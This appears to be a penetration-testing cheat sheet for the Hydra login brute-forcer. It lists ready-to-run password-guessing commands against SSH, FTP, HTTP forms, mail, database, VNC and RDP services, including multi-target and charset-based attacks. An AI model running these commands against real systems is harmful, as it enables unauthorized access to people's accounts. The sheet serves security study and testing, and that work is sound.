### Content
- Basic Usage
- Services
	- SSH
	- HTTP
	- RDP
## Basic usage
``` bash
hydra [login_options] [password_options] [attack_options] [service_options]
```
* `-l <username>`  / `-L useranems.tx`
* `-p <password>` / `-P passwords.txt`
* `-t <number of parallel tasks (threads)>` 
* `-f` Fast mode: Stop the attack after the first successful login is found.
* `-s <port>`
* `service://server` Service (e.g., `ssh`, `http`, `ftp`) and the target server's address or hostname.
---
## Services

| Hydra Service   | Example Command                                                                                                   |
| --------------- | ----------------------------------------------------------------------------------------------------------------- |
| `ftp`           | `hydra -l admin -P /path/to/password_list.txt ftp://192.168.1.100`                                                |
| `ssh`           | `hydra -l root -P /path/to/password_list.txt ssh://192.168.1.100`                                                 |
| `http-get/post` | `hydra -l admin -P passwords.txt www.example.com http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"` |
| `smtp`          | `hydra -l admin -P /path/to/password_list.txt smtp://mail.server.com`                                             |
| `pop3`          | `hydra -l user@example.com -P /path/to/password_list.txt pop3://mail.server.com`                                  |
| `imap`          | `hydra -l user@example.com -P /path/to/password_list.txt imap://mail.server.com`                                  |
| `mysql`         | `hydra -l root -P /path/to/password_list.txt mysql://192.168.1.100`                                               |
| `mssql`         | `hydra -l sa -P /path/to/password_list.txt mssql://192.168.1.100`                                                 |
| `vnc`           | `hydra -P /path/to/password_list.txt vnc://192.168.1.100`                                                         |
| `rdp`           | `hydra -l admin -P /path/to/password_list.txt rdp://192.168.1.100`                                                |

#### SSH
Targeting Multiple SSH Servers:
``` bash
hydra -l root -p toor -M targets.txt ssh
```
#### HTTP 
POST `hydra [options] target http-post-form "path:params:condition_string"`
* failure conditions (`F=...`) it can be a word or http request status code
* success condition (`S=...`) it can be a word or http request status code
``` bash
hydra -L usernames.tx -P passwords.txt -f "http-post-form://94.237.60.32:33898/:username=^USER^&password=^PASS^:F=Invalid credentials"
# OR
hydra -L usernames.txt -P passwords.txt -f 94.237.60.32 -s 33898 http-post-form "/:username=^USER^&password=^PASS^:F=Invalid credentials"
```
GET
``` bash
hydra -l basic-auth-user -P passwords.txt 94.237.53.3 http-get / -f -s 58756
# OR
hydra http-get://94.237.53.3:58756/ -l basic-auth-user -P passwords.txt
```
#### RDP
password consists of 6 to 8 characters, including lowercase letters, uppercase letters, and numbers.
``` bash
hydra -l administrator -x 6:8:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 192.168.1.100 rdp
```
---